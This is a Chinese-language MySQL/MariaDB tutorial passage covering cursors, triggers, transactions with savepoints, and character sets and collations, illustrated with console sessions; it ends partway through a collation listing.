在一个游标关闭后,如果没有重新打开,则不能使用它。但是,使用声明过的游标不需要再次声明,用 OPEN 语句打开它就可以了。 隐含关闭 如果你不明确关闭游标, MySQL将会在到达 END 语句时自动关闭它。 下面是前面例子的修改版本: 123456789101112MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure processorders() -&gt; begin -&gt; declare ordernumbers cursor -&gt; for -&gt; select order_num from orders; -&gt; open ordernumbers; -&gt; close ordernumbers; -&gt; end //Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; 这个存储过程声明、打开和关闭一个游标。但对检索出的数据什么也没做。 3.使用游标数据 在一个游标被打开后,可以使用 FETCH 语句分别访问它的每一行。FETCH 指定检索什么数据(所需的列),检索出来的数据存储在什么地方。它还向前移动游标中的内部行指针,使下一条 FETCH 语句检索下一行(不重复读取同一行)。 第一个例子从游标中检索单个行(第一行): 123456789MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure processorders() begin declare o int;declare ordernumbers cursor for select order_num from orders; -&gt; open ordernumbers; -&gt; fetch ordernumbers into o; -&gt; close ordernumbers; -&gt; end //Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; 其中 FETCH用来检索当前行的 order_num 列(将自动从第一行开始)到一个名为 o 的局部声明的变量中。对检索出的数据不做任何处理。 在下一个例子中,循环检索数据,从第一行到最后一行: 12345MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure processorders() begin declare done boolean default 0;declare o int;declare ordernumbers cursor for select order_num from orders;declare continue handler for sqlstate &apos;02000&apos; set done=1; open ordernumbers;repeat fetch ordernumbers into o;until done end repeat; close ordernumbers; end//Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; 与前一个例子一样,这个例子使用 FETCH检索当前 order_num到声明的名为 o 的变量中。但与前一个例子不一样的是,这个例子中的 FETCH 是在 REPEAT 内,因此它反复执行直到 done 为真(由 UNTIL done END REPEAT; 规定)。 为使它起作用,用一个 DEFAULT 0(假,不结束)定义变量 done 。那么, done 怎样才能在结束时被设置为真呢? 答案是用以下语句:declare conitinue handler for sqlstate &apos;02000&apos; set done=1这条语句定义了一个 CONTINUE HANDLER ,它是在条件出现时被执行的代码。这里,它指出当 SQLSTATE &apos;02000&apos; 出现时, SET done=1。SQLSTATE &apos;02000&apos; 是一个未找到条件,当 REPEAT 由于没有更多的行供循环而不能继续时,出现这个条件。 MySQL的错误代码 关于MySQL 5使用的MySQL错误代码列表,请参阅http://dev.mysql.com/doc/mysql/en/error-handling.html。 DECLARE 语句的次序 DECLARE 语句的发布存在特定的次序。用 DECLARE 语句定义的局部变量必须在定义任意游标或句柄之前定义,而句柄必须在游标之后定义。不遵守此顺序将产生错误消息。 如果调用这个存储过程,它将定义几个变量和一个 CONTINUE HANDLER ,定义并打开一个游标,重复读取所有行,然后关闭游标。如果一切正常,你可以在循环内放入任意需要的处理(在 FETCH 语句之后,循环结束之前)。 重复或循环? 除这里使用的REPEAT 语句外,MySQL还支持循环语句,它可用来重复执行代码,直到使用 LEAVE 语句手动退出为止。通常 REPEAT 语句的语法使它更适合于对游标进行循环。 为了把这些内容组织起来,下面给出我们的游标存储过程样例的更进一步修改的版本,这次对取出的数据进行某种实际的处理: 12345MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create procedure processorders() begin declare done boolean default 0;declare o int;declare t decimal(8,2);declare ordernumbers cursor for select order_num from orders;declare continue handler for sqlstate &apos;02000&apos; set done=1; create table if not exists ordertotals (order_num int,total decimal(8,2)); open ordernumbers;repeat fetch ordernumbers into o;call ordertotal(o,1,t);insert into ordertotals(order_num,total) values (o,t);until done end repeat; close ordernumbers; end//Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delimiter ; 在这个例子中,我们增加了另一个名为 t 的变量(存储每个订单的合计)。此存储过程还在运行中创建了一个新表(如果它不存在的话),名为 ordertotals 。这个表将保存存储过程生成的结果。 FETCH像以前一样取每个 order_num ,然后用 CALL执行另一个存储过程(我们在前一章中创建)来计算每个订单的带税的合计(结果存储到 t )。最后,用 INSERT 保存每个订单的订单号和合计。 此存储过程不返回数据,但它能够创建和填充另一个表,可以用一条简单的 SELECT 语句查看该表: 123456789101112131415MariaDB [test]&gt; call processorders();Query OK, 1 row affected (0.48 sec)MariaDB [test]&gt; select * from ordertotals;+-----------+---------+| order_num | total |+-----------+---------+| 20005 | 158.86 || 20009 | 40.78 || 20006 | 58.30 || 20007 | 1060.00 || 20008 | 132.50 || 20008 | 132.50 |+-----------+---------+6 rows in set (0.00 sec) 这样,我们就得到了存储过程、游标、逐行处理以及存储过程调用其他存储过程的一个完整的工作样例。 小结 本章介绍了什么是游标以及为什么要使用游标,举了演示基本游标使用的例子,并且讲解了对游标结果进行循环以及逐行处理的技术。 使用触发器本章学习什么是触发器,为什么要使用触发器以及如何使用触发器。 本章还介绍创建和使用触发器的语法。 触发器 需要MySQL 5 对触发器的支持是在MySQL 5中增加的。因此,本章内容适用于MySQL 5或之后的版本。 MySQL语句在需要时被执行,存储过程也是如此。但是,如果你想要某条语句(或某些语句)在事件发生时自动执行,怎么办呢?例如: 每当增加一个顾客到某个数据库表时,都检查其电话号码格式是否正确,州的缩写是否为大写; 每当订购一个产品时,都从库存数量中减去订购的数量; 无论何时删除一行,都在某个存档表中保留一个副本。 所有这些例子的共同之处是它们都需要在某个表发生更改时自动处理。这确切地说就是触发器。触发器是MySQL响应以下任意语句而自动执行的一条MySQL语句(或位于 BEGIN 和 END 语句之间的一组语句): DELETE ; INSERT ; UPDATE 。 其他MySQL语句不支持触发器。 创建触发器 在创建触发器时,需要给出4条信息: 唯一的触发器名; 触发器关联的表; 触发器应该响应的活动( DELETE 、 INSERT 或 UPDATE ); 触发器何时执行(处理之前或之后)。 保持每个数据库的触发器名唯一 在MySQL 5中,触发器名必须在每个表中唯一,但不是在每个数据库中唯一。这表示同一数据库中的两个表可具有相同名字的触发器。这在其他每个数据库触发器名必须唯一的DBMS中是不允许的,而且以后的MySQL版本很可能会使命名规则更为严格。因此,现在最好是在数据库范围内使用唯一的触发器名。 触发器用 CREATE TRIGGER 语句创建。下面是一个简单的例子: 12345678910111213MariaDB [test]&gt; create trigger triggervendors after insert on vendors for each row select &apos;hello&apos; into @args;Query OK, 0 rows affected (0.35 sec)MariaDB [test]&gt; insert into vendors values (2007,&apos;xx&apos;,null,null,null,null,null);Query OK, 1 row affected (0.05 sec)MariaDB [test]&gt; select @args;+-------+| @args |+-------+| hello |+-------+1 row in set (0.00 sec) CREATE TRIGGER 用来创建名为 triggervendors的新触发器。触发器可在一个操作发生之前或之后执行,这里给出了 AFTER INSERT ,所以此触发器将在 INSERT 语句成功执行后执行。这个触发器还指定FOR EACH ROW ,因此代码对每个插入行执行。在这个例子中,文本 hello 将对每个插入的行显示一次。为了测试这个触发器,使用INSERT语句添加一行或多行到vendors中,你将看到对每个成功的插入,显示hello` 消息。 仅支持表 只有表才支持触发器,视图不支持(临时表也不支持)。 触发器按每个表每个事件每次地定义,每个表每个事件每次只允许一个触发器。因此,每个表最多支持6个触发器(每条 INSERT 、 UPDATE和 DELETE 的之前和之后)。单一触发器不能与多个事件或多个表关联,所以,如果你需要一个对 INSERT 和 UPDATE 操作执行的触发器,则应该定义两个触发器。 触发器失败 如果 BEFORE 触发器失败,则MySQL将不执行请求的操作。此外,如果 BEFORE 触发器或语句本身失败, MySQL将不执行 AFTER 触发器(如果有的话)。 删除触发器 现在,删除触发器的语法应该很明显了。为了删除一个触发器,可使用 DROP TRIGGER 语句,如下所示: 12MariaDB [test]&gt; drop trigger triggervendors;Query OK, 0 rows affected (0.00 sec) 触发器不能更新或覆盖。为了修改一个触发器,必须先删除它,然后再重新创建。 使用触发器 在有了前面的基础知识后,我们现在来看所支持的每种触发器类型以及它们的差别。 1.INSERT 触发器 INSERT 触发器在 INSERT 语句执行之前或之后执行。需要知道以下几点: 在 INSERT 触发器代码内,可引用一个名为 NEW 的虚拟表,访问被插入的行; 在 BEFORE INSERT 触发器中, NEW 中的值也可以被更新(允许更改被插入的值); 对于 AUTO_INCREMENT 列, NEW 在 INSERT 执行之前包含 0 ,在 INSERT执行之后包含新的自动生成值。 下面举一个例子(一个实际有用的例子)。 AUTO_INCREMENT 列具有MySQL自动赋予的值。之前建议了几种确定新生成值的方法,但下面是一种更好的方法: 12MariaDB [test]&gt; create trigger neworder after insert on orders for each row select new.order_num into @hh;Query OK, 0 rows affected (0.37 sec) 此代码创建一个名为 neworder 的触发器,它按照 AFTER INSERTON orders 执行。在插入一个新订单到orders表时,MySQL生成一个新订单号并保存到 order_num 中。触发器从 NEW. order_num 取得这个值并返回它。此触发器必须按照 AFTER INSERT 执行,因为在 BEFOREINSERT 语句执行之前,新 order_num 还没有生成。对于 orders 的每次插入使用这个触发器将总是返回新的订单号。 为测试这个触发器,试着插入一下新行,如下所示: 1234567891011121314151617181920212223MariaDB [test]&gt; insert into orders (order_date,cust_id) values (now(),10001);Query OK, 1 row affected (0.60 sec)MariaDB [test]&gt; select @hh;+-------+| @hh |+-------+| 20010 |+-------+1 row in set (0.00 sec)MariaDB [test]&gt; select * from orders;+-----------+---------------------+---------+| order_num | order_date | cust_id |+-----------+---------------------+---------+| 20005 | 2005-09-01 00:00:00 | 10001 || 20006 | 2005-09-12 00:00:00 | 10003 || 20007 | 2005-09-30 00:00:00 | 10004 || 20008 | 2005-10-03 00:00:00 | 10005 || 20009 | 2005-10-08 00:00:00 | 10001 || 20010 | 2016-09-21 11:08:47 | 10001 |+-----------+---------------------+---------+6 rows in set (0.00 sec) orders包含3个列。order_date 和 cust_id必须给出,order_num 由MySQL自动生成,而现在 order_num 还自动被返回。 BEFORE 或 AFTER ? 通常,将 BEFORE 用于数据验证和净化(目的是保证插入表中的数据确实是需要的数据)。本提示也适用于 UPDATE 触发器。 2.DELETE 触发器 DELETE 触发器在 DELETE 语句执行之前或之后执行。需要知道以下两点: 在 DELETE 触发器代码内,你可以引用一个名为 OLD 的虚拟表,访问被删除的行; OLD 中的值全都是只读的,不能更新。 下面的例子演示使用 OLD 保存将要被删除的行到一个存档表中: 123456MariaDB [test]&gt; delimiter //MariaDB [test]&gt; create trigger deleteorder before delete on orders for each row begin insert into archive_orders(order_num,order_date,cust_id) values (OLD.order_num,OLD.order_date,OLD.cust_id); end//Query OK, 0 rows affected (0.07 sec)MariaDB [test]&gt; delimiter ; 在任意订单被删除前将执行此触发器。它使用一条 INSERT语句将 OLD 中的值(要被删除的订单)保存到一个名为 archive_orders 的存档表中(为实际使用这个例子,你需要用与 orders 相同的列创建一个名为 archive_orders 的表)。 使用 BEFORE DELETE 触发器的优点(相对于 AFTER DELETE 触发器来说)为,如果由于某种原因,订单不能存档, DELETE 本身将被放弃。 多语句触发器 正如所见,触发器 deleteorder 使用 BEGIN 和END 语句标记触发器体。这在此例子中并不是必需的,不过也没有害处。使用 BEGIN END 块的好处是触发器能容纳多条SQL语句(在 BEGIN END块 中一条挨着一条)。 3.UPDATE 触发器 UPDATE 触发器在 UPDATE 语句执行之前或之后执行。需要知道以下几点: 在 UPDATE 触发器代码中,你可以引用一个名为 OLD 的虚拟表访问以前( UPDATE 语句前)的值,引用一个名为 NEW 的虚拟表访问新更新的值; 在 BEFORE UPDATE 触发器中, NEW 中的值可能也被更新(允许更改将要用于 UPDATE 语句中的值); OLD 中的值全都是只读的,不能更新。 下面的例子保证州名缩写总是大写(不管 UPDATE 语句中给出的是大写还是小写): 显然,任何数据净化都需要在 UPDATE 语句之前进行,就像这个例子中一样。 每次更新一个行时, NEW.vend_state 中的值(将用来更新表行的值)都用 Upper(NEW.vend_state) 替换。 12MariaDB [test]&gt; create trigger updatevendor before update on vendors for each row set New.vend_state = Upper（new.vend_state）;Query OK, 0 rows affected (0.35 sec) 4.关于触发器的进一步介绍 在结束本章之前,我们再介绍一些使用触发器时需要记住的重点。 与其他DBMS相比,MySQL 5中支持的触发器相当初级。未来的MySQL版本中有一些改进和增强触发器支持的计划。 创建触发器可能需要特殊的安全访问权限,但是,触发器的执行是自动的。如果 INSERT 、 UPDATE 或 DELETE 语句能够执行,则相关的触发器也能执行。 应该用触发器来保证数据的一致性(大小写、格式等)。在触发器中执行这种类型的处理的优点是它总是进行这种处理,而且是透明地进行,与客户机应用无关。 触发器的一种非常有意义的使用是创建审计跟踪。使用触发器,把更改(如果需要,甚至还有之前和之后的状态)记录到另一个表非常容易。 遗憾的是,MySQL触发器中不支持 CALL 语句。这表示不能从触发器内调用存储过程。所需的存储过程代码需要复制到触发器内。 小结 本章介绍了什么是触发器以及为什么要使用触发器,学习了触发器的类型和何时执行它们,列举了几个用于 INSERT 、 DELETE 和 UPDATE 操作的触发器例子。 管理事务处理本章介绍什么是事务处理以及如何利用 COMMIT 和 ROLLBACK 语句来管理事务处理。 事务处理 并非所有引擎都支持事务处理 MySQL支持几种基本的数据库引擎，并非所有引擎都支持明确的事务处理管理。 MyISAM 和 InnoDB 是两种最常使用的引擎。前者不支持明确的事务处理管理,而后者支持。这就是为什么本书中使用的样例表被创建来使用 InnoDB 而不是更经常使用的 MyISAM 的原因。如果你的应用中需要事务处理功能,则一定要使用正确的引擎类型。 事务处理(transaction processing)可以用来维护数据库的完整性,它保证成批的MySQL操作要么完全执行,要么完全不执行。 关系数据库设计把数据存储在多个表中,使数据更容易操纵、维护和重用。不用深究如何以及为什么进行关系数据库设计,在某种程度上说,设计良好的数据库模式都是关联的。 前面章中使用的 orders 表就是一个很好的例子。订单存储在 orders和 orderitems两个表中: orders 存储实际的订单,而 orderitems 存储订购的各项物品。这两个表使用称为主键的唯一ID互相关联。这两个表又与包含客户和产品信息的其他表相关联。 给系统添加订单的过程如下。 (1) 检查数据库中是否存在相应的客户(从 customers 表查询),如果不存在,添加他/她。(2) 检索客户的ID。(3) 添加一行到 orders 表,把它与客户ID关联。(4) 检索 orders 表中赋予的新订单ID。(5) 对于订购的每个物品在 orderitems 表中添加一行,通过检索出来的ID把它与 orders 表关联(以及通过产品ID与 products 表关联)。 现在,假如由于某种数据库故障(如超出磁盘空间、安全限制、表锁等)阻止了这个过程的完成。数据库中的数据会出现什么情况? 如果故障发生在添加了客户之后, orders 表添加之前,不会有什么问题。某些客户没有订单是完全合法的。在重新执行此过程时,所插入的客户记录将被检索和使用。可以有效地从出故障的地方开始执行此过程。 但是,如果故障发生在 orders 行添加之后, orderitems 行添加之前,怎么办呢?现在,数据库中有一个空订单。 更糟的是,如果系统在添加 orderitems 行之中出现故障。结果是数据库中存在不完整的订单,而且你还不知道。 如何解决这种问题?这里就需要使用事务处理了。事务处理是一种机制,用来管理必须成批执行的MySQL操作,以保证数据库不包含不完整的操作结果。利用事务处理,可以保证一组操作不会中途停止,它们或者作为整体执行,或者完全不执行(除非明确指示)。如果没有错误发生,整组语句提交给(写到)数据库表。如果发生错误,则进行回退(撤销)以恢复数据库到某个已知且安全的状态。 因此,请看相同的例子,这次我们说明过程如何工作。 检查数据库中是否存在相应的客户,如果不存在,添加他/她。 提交客户信息。 检索客户的ID。 添加一行到 orders 表。 如果在添加行到 orders 表时出现故障,回退。 检索 orders 表中赋予的新订单ID。 对于订购的每项物品,添加新行到 orderitems 表。 如果在添加新行到 orderitems 时出现故障,回退所有添加的orderitems 行和 orders 行。 提交订单信息。 在使用事务和事务处理时,有几个关键词汇反复出现。下面是关于事务处理需要知道的几个术语: 事务( transaction )指一组SQL语句; 回退( rollback )指撤销指定SQL语句的过程; 提交( commit )指将未存储的SQL语句结果写入数据库表; 保留点( savepoint )指事务处理中设置的临时占位符(place-holder),你可以对它发布回退(与回退整个事务处理不同)。 控制事务处理 既然我们已经知道了什么是事务处理,下面讨论事务处理的管理中所涉及的问题。 管理事务处理的关键在于将SQL语句组分解为逻辑块,并明确规定数据何时应该回退,何时不应该回退。 MySQL使用下面的语句来标识事务的开始:start transaction; 1.使用 ROLLBACK MySQL的 ROLLBACK 命令用来回退(撤销)MySQL语句,请看下面的语句: 12345678910111213141516171819202122232425262728293031323334353637MariaDB [test]&gt; select * from ordertotals;+-----------+---------+| order_num | total |+-----------+---------+| 20005 | 158.86 || 20009 | 40.78 || 20006 | 58.30 || 20007 | 1060.00 || 20008 | 132.50 || 20008 | 132.50 |+-----------+---------+6 rows in set (0.00 sec)MariaDB [test]&gt; start transaction;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delete from ordertotals;Query OK, 6 rows affected (0.00 sec)MariaDB [test]&gt; select * from ordertotals;Empty set (0.00 sec)MariaDB [test]&gt; rollback;Query OK, 0 rows affected (0.55 sec)MariaDB [test]&gt; select * from ordertotals;+-----------+---------+| order_num | total |+-----------+---------+| 20005 | 158.86 || 20009 | 40.78 || 20006 | 58.30 || 20007 | 1060.00 || 20008 | 132.50 || 20008 | 132.50 |+-----------+---------+6 rows in set (0.00 sec) 这个例子从显示 ordertotals 表的内容开始。首先执行一条 SELECT 以显示该表不为空。然后开始一个事务处理,用一条 DELETE 语句删除 ordertotals 中的所有行。另一条SELECT 语句验证 ordertotals 确实为空。这时用一条 ROLLBACK 语句回退START TRANSACTION 之后的所有语句,最后一条 SELECT 语句显示该表不为空。 显然, ROLLBACK 只能在一个事务处理内使用(在执行一条 STARTTRANSACTION 命令之后)。 哪些语句可以回退? 事务处理用来管理 INSERT 、 UPDATE 和DELETE 语句。你不能回退 SELECT 语句。(这样做也没有什么意义。)你不能回退 CREATE 或 DROP 操作。事务处理块中可以使用这两条语句,但如果你执行回退,它们不会被撤销。 2.使用 COMMIT 一般的MySQL语句都是直接针对数据库表执行和编写的。这就是所谓的隐含提交(implicit commit),即提交(写或保存)操作是自动进行的。 但是,在事务处理块中,提交不会隐含地进行。为进行明确的提交,使用 COMMIT 语句,如下所示: 1234567891011MariaDB [test]&gt; start transaction;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delete from orderitems where order_num=20010;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delete from orders where order_num=20010;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; commit;Query OK, 0 rows affected (0.00 sec) 在这个例子中,从系统中完全删除订单 20010 。因为涉及更新两个数据库表 orders 和 orderItems ,所以使用事务处理块来保证订单不被部分删除。最后的 COMMIT 语句仅在不出错时写出更改。如果第一条 DELETE 起作用,但第二条失败,则 DELETE 不会提交(实际上,它是被自动撤销的)。 隐含事务关闭 当 COMMIT 或 ROLLBACK 语句执行后,事务会自隐含事务关闭动关闭(将来的更改会隐含提交)。 3.使用保留点 简单的 ROLLBACK 和 COMMIT 语句就可以写入或撤销整个事务处理。但是,只是对简单的事务处理才能这样做,更复杂的事务处理可能需要部分提交或回退。 例如,前面描述的添加订单的过程为一个事务处理。如果发生错误,只需要返回到添加 orders 行之前即可,不需要回退到 customers 表(如果存在的话)。 为了支持回退部分事务处理,必须能在事务处理块中合适的位置放置占位符。这样,如果需要回退,可以回退到某个占位符。 这些占位符称为保留点。为了创建占位符,可如下使用 SAVEPOINT语句:savepoint delete1; 每个保留点都取标识它的唯一名字,以便在回退时,MySQL知道要回退到何处。为了回退到本例给出的保留点,可如下进行:rollback to delete1; 保留点越多越好 可以在MySQL代码中设置任意多的保留点,越多越好。为什么呢?因为保留点越多,你就越能按自己的意愿灵活地进行回退。 释放保留点 保留点在事务处理完成(执行一条 ROLLBACK 或COMMIT )后自动释放。自MySQL 5以来,也可以用 RELEASESAVEPOINT 明确地释放保留点。 4.更改默认的提交行为 正如所述,默认的MySQL行为是自动提交所有更改。换句话说,任何时候你执行一条MySQL语句,该语句实际上都是针对表执行的,而且所做的更改立即生效。为指示MySQL不自动提交更改,需要使用以下语句:set autocommit=0; autocommit 标志决定是否自动提交更改,不管有没有 COMMIT语句。设置 autocommit 为0 (假)指示MySQL不自动提交更改(直到 autocommit 被设置为 1 真为止)。 标志为连接专用 autocommit 标志是针对每个连接而不是服务器的。 查看autocommit的值 123456789101112131415MariaDB [test]&gt; show variables like &apos;%autocommit%&apos;;+---------------+-------+| Variable_name | Value |+---------------+-------+| autocommit | ON |+---------------+-------+1 row in set (0.00 sec)MariaDB [test]&gt; select @@autocommit;+--------------+| @@autocommit |+--------------+| 1 |+--------------+1 row in set (0.00 sec) 课堂练习 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697MariaDB [test]&gt; create database db1;Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; create table db1.t1 (id int primary key );Query OK, 0 rows affected (0.06 sec)MariaDB [test]&gt; insert into db1.t1 values (1);Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; select * from db1.t1;+----+| id |+----+| 1 |+----+1 row in set (0.00 sec)MariaDB [test]&gt; start transaction;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; delete from db1.t1;Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; savepoint delete1;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; insert into db1.t1 values (10);Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; savepoint insert1;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select * from db1.t1;+----+| id |+----+| 10 |+----+1 row in set (0.00 sec)MariaDB [test]&gt; rollback to delete1;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select * from db1.t1;Empty set (0.00 sec)MariaDB [test]&gt; rollback to insert1;ERROR 1305 (42000): SAVEPOINT insert1 does not existMariaDB [test]&gt; rollback to insert1;ERROR 1305 (42000): SAVEPOINT insert1 does not existMariaDB [test]&gt; insert into db1.t1 values (20);Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; select * from db1.t1;+----+| id |+----+| 20 |+----+1 row in set (0.00 sec)MariaDB [test]&gt; savepoint in1;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; insert into db1.t1 values (30);Query OK, 1 row affected (0.00 sec)MariaDB [test]&gt; savepoint in2;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select * from db1.t1;+----+| id |+----+| 20 || 30 |+----+2 rows in set (0.00 sec)MariaDB [test]&gt; rollback to in1;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select * from db1.t1;+----+| id |+----+| 20 |+----+1 row in set (0.00 sec)MariaDB [test]&gt; rollback to in2;ERROR 1305 (42000): SAVEPOINT in2 does not existMariaDB [test]&gt; rollback to delete1;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select * from db1.t1;Empty set (0.00 sec) 注意，当退回到某个保留点时，该保留点之后的保留点就会消失。 小结 本章介绍了事务处理是必须完整执行的SQL语句块。我们学习了如何使用 COMMIT 和 ROLLBACK 语句对何时写数据,何时撤销进行明确的管理。还学习了如何使用保留点对回退操作提供更强大的控制。 全球化和本地化本章介绍MySQL处理不同字符集和语言的基础知识。 字符集和校对顺序 数据库表被用来存储和检索数据。不同的语言和字符集需要以不同的方式存储和检索。因此,MySQL需要适应不同的字符集(不同的字和字符),适应不同的排序和检索数据的方法。 在讨论多种语言和字符集时,将会遇到以下重要术语: 字符集为字母和符号的集合; 编码为某个字符集成员的内部表示; 校对为规定字符如何比较的指令。 校对为什么重要 排序英文正文很容易,对吗?或许不。考虑词APE、apex和Apple。它们处于正确的排序顺序吗?这有赖于你是否想区分大小写。使用区分大小写的校对顺序,这些词有一种排序方式,使用不区分大小写的校对顺序有另外一种排序方式。这不仅影响排序(如用 ORDER BY 排序数据),还影响搜索(例如,寻找apple的WHERE子句是否能找到APPLE)。在使用诸如法文à或德文ö这样的字符时,情况更复杂,在使用不基于拉丁文的字符集(日文、希伯来文、俄文等)时,情况更为复杂。 在MySQL的正常数据库活动( SELECT 、 INSERT 等)中,不需要操心太多的东西。使用何种字符集和校对的决定在服务器、数据库和表级进行。 使用字符集和校对顺序 MySQL支持众多的字符集。为查看所支持的字符集完整列表,使用以下语句: 123456789101112131415161718192021222324252627282930313233343536373839404142434445MariaDB [test]&gt; show character set;+----------+-----------------------------+---------------------+--------+| Charset | Description | Default collation | Maxlen |+----------+-----------------------------+---------------------+--------+| big5 | Big5 Traditional Chinese | big5_chinese_ci | 2 || dec8 | DEC West European | dec8_swedish_ci | 1 || cp850 | DOS West European | cp850_general_ci | 1 || hp8 | HP West European | hp8_english_ci | 1 || koi8r | KOI8-R Relcom Russian | koi8r_general_ci | 1 || latin1 | cp1252 West European | latin1_swedish_ci | 1 || latin2 | ISO 8859-2 Central European | latin2_general_ci | 1 || swe7 | 7bit Swedish | swe7_swedish_ci | 1 || ascii | US ASCII | ascii_general_ci | 1 || ujis | EUC-JP Japanese | ujis_japanese_ci | 3 || sjis | Shift-JIS Japanese | sjis_japanese_ci | 2 || hebrew | ISO 8859-8 Hebrew | hebrew_general_ci | 1 || tis620 | TIS620 Thai | tis620_thai_ci | 1 || euckr | EUC-KR Korean | euckr_korean_ci | 2 || koi8u | KOI8-U Ukrainian | koi8u_general_ci | 1 || gb2312 | GB2312 Simplified Chinese | gb2312_chinese_ci | 2 || greek | ISO 8859-7 Greek | greek_general_ci | 1 || cp1250 | Windows Central European | cp1250_general_ci | 1 || gbk | GBK Simplified Chinese | gbk_chinese_ci | 2 || latin5 | ISO 8859-9 Turkish | latin5_turkish_ci | 1 || armscii8 | ARMSCII-8 Armenian | armscii8_general_ci | 1 || utf8 | UTF-8 Unicode | utf8_general_ci | 3 || ucs2 | UCS-2 Unicode | ucs2_general_ci | 2 || cp866 | DOS Russian | cp866_general_ci | 1 || keybcs2 | DOS Kamenicky Czech-Slovak | keybcs2_general_ci | 1 || macce | Mac Central European | macce_general_ci | 1 || macroman | Mac West European | macroman_general_ci | 1 || cp852 | DOS Central European | cp852_general_ci | 1 || latin7 | ISO 8859-13 Baltic | latin7_general_ci | 1 || utf8mb4 | UTF-8 Unicode | utf8mb4_general_ci | 4 || cp1251 | Windows Cyrillic | cp1251_general_ci | 1 || utf16 | UTF-16 Unicode | utf16_general_ci | 4 || cp1256 | Windows Arabic | cp1256_general_ci | 1 || cp1257 | Windows Baltic | cp1257_general_ci | 1 || utf32 | UTF-32 Unicode | utf32_general_ci | 4 || binary | Binary pseudo charset | binary | 1 || geostd8 | GEOSTD8 Georgian | geostd8_general_ci | 1 || cp932 | SJIS for Windows Japanese | cp932_japanese_ci | 2 || eucjpms | UJIS for Windows Japanese | eucjpms_japanese_ci | 3 |+----------+-----------------------------+---------------------+--------+39 rows in set (0.00 sec) 这条语句显示所有可用的字符集以及每个字符集的描述和默认校对。 为了查看所支持校对的完整列表,使用以下语句: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223MariaDB [test]&gt; show collation;+--------------------------+----------+-----+---------+----------+---------+| Collation | Charset | Id | Default | Compiled | Sortlen |+--------------------------+----------+-----+---------+----------+---------+| big5_chinese_ci | big5 | 1 | Yes | Yes | 1 || big5_bin | big5 | 84 | | Yes | 1 || dec8_swedish_ci | dec8 | 3 | Yes | Yes | 1 || dec8_bin | dec8 | 69 | | Yes | 1 || cp850_general_ci | cp850 | 4 | Yes | Yes | 1 || cp850_bin | cp850 | 80 | | Yes | 1 || hp8_english_ci | hp8 | 6 | Yes | Yes | 1 || hp8_bin | hp8 | 72 | | Yes | 1 || koi8r_general_ci | koi8r | 7 | Yes | Yes | 1 || koi8r_bin | koi8r | 74 | | Yes | 1 || latin1_german1_ci | latin1 | 5 | | Yes | 1 || latin1_swedish_ci | latin1 | 8 | Yes | Yes | 1 || latin1_danish_ci | latin1 | 15 | | Yes | 1 || latin1_german2_ci | latin1 | 31 | | Yes | 2 || latin1_bin | latin1 | 47 | | Yes | 1 || latin1_general_ci | latin1 | 48 | | Yes | 1 || latin1_general_cs | latin1 | 49 | | Yes | 1 || latin1_spanish_ci | latin1 | 94 | | Yes | 1 || latin2_czech_cs | latin2 | 2 | | Yes | 4 || latin2_general_ci | latin2 | 9 | Yes | Yes | 1 || latin2_hungarian_ci | latin2 | 21 | | Yes | 1 || latin2_croatian_ci | latin2 | 27 | | Yes | 1 || latin2_bin | latin2 | 77 | | Yes | 1 || swe7_swedish_ci | swe7 | 10 | Yes | Yes | 1 || swe7_bin | swe7 | 82 | | Yes | 1 || ascii_general_ci | ascii | 11 | Yes | Yes | 1 || ascii_bin | ascii | 65 | | Yes | 1 || ujis_japanese_ci | ujis | 12 | Yes | Yes | 1 || ujis_bin | ujis | 91 | | Yes | 1 || sjis_japanese_ci | sjis | 13 | Yes | Yes | 1 || sjis_bin | sjis | 88 | | Yes | 1 || hebrew_general_ci | hebrew | 16 | Yes | Yes | 1 || hebrew_bin | hebrew | 71 | | Yes | 1 || tis620_thai_ci | tis620 | 18 | Yes | Yes | 4 || tis620_bin | tis620 | 89 | | Yes | 1 || euckr_korean_ci | euckr | 19 | Yes | Yes | 1 || euckr_bin | euckr | 85 | | Yes | 1 || koi8u_general_ci | koi8u | 22 | Yes | Yes | 1 || koi8u_bin | koi8u | 75 | | Yes | 1 || gb2312_chinese_ci | gb2312 | 24 | Yes | Yes | 1 || gb2312_bin | gb2312 | 86 | | Yes | 1 || greek_general_ci | greek | 25 | Yes | Yes | 1 || greek_bin | greek | 70 | | Yes | 1 || cp1250_general_ci | cp1250 | 26 | Yes | Yes | 1 || cp1250_czech_cs | cp1250 | 34 | | Yes | 2 || cp1250_croatian_ci | cp1250 | 44 | | Yes | 1 || cp1250_bin | cp1250 | 66 | | Yes | 1 || cp1250_polish_ci | cp1250 | 99 | | Yes | 1 || gbk_chinese_ci | gbk 